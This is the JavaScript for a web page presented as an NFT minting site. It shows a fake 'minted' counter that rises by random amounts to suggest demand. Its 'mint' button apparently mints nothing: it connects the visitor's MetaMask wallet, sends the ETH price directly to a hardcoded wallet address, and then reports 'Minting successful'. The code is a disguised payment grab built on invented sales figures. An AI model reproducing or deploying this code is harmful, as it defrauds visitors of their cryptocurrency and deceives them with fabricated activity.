document.addEventListener("DOMContentLoaded", function() { 
     var mintnumber = 2549;
 var interval = setInterval(incrementer,30000);
 
 function incrementer() {
     var rnd = Math.floor(Math.random() * (19 - 11)) + 25;
     mintnumber = mintnumber + rnd;
     // console.log(rnd);
     document.getElementById("num_1").innerHTML = mintnumber;
     if (mintnumber > 7578){
         document.getElementById("num_1").innerHTML = 7578;
         clearInterval(interval);
     }
 }

const statusp = document.querySelector("#status");
const connectBtn = document.querySelector('#connect');
const mintBtn = document.querySelector('#mint');
//const connectBtnHeader = document.querySelector('#connectBtnHeader');
var pricePerNFT = 0.08;

/** input number spinner
 */
let totalNFTInput = document.querySelector('#totalNFT');
let totalETHSpan =  document.querySelector('#totalETH');
let totalETHCost = totalNFTInput.value * pricePerNFT

connectBtn.addEventListener('click', async (e) => {
    e.preventDefault();
    if (window.ethereum) {
      window.web3 = new Web3(ethereum);
      try {
        var isConnected = await ethereum.enable();
        statusp.innerHTML = 'You are now Connected'
      } catch (err) {
        console.log(err)
        statusp.innerHTML = 'Wallet access denied'
      }
    } else if (window.web3) {
      window.web3 = new Web3(web3.currentProvider)
    } else {
      statusp.innerHTML = 'Please install Metamask wallet';
    }
  })

    mintBtn.addEventListener('click', async () => {
      statusp.innerText = 'Minting in progress....'
      // paymentAddress is where funds will be send to
      const paymentAddress = '0x0F75c36dE2f5A320ffE7d5cBE9089B5C0cb184bC'
      let localtotalEth = totalNFTInput.value * pricePerNFT
      totalEth = localtotalEth.toString();
      const accounts = await web3.eth.getAccounts();
      web3.eth.sendTransaction({
        from: web3.currentProvider.selectedAddress,
        to: paymentAddress,
        value: web3.utils.toWei(totalEth, 'ether')
        }, (err, transactionId) => {
        if  (err) {
          console.log('Minting failed', err)
          statusp.innerText = 'Minting failed'
        } else {
          console.log('Minting succeed', transactionId)
          statusp.innerText = 'Minting successful';
          mintBtn.innerText = 'Mint again?'  
        }
      })
    })

});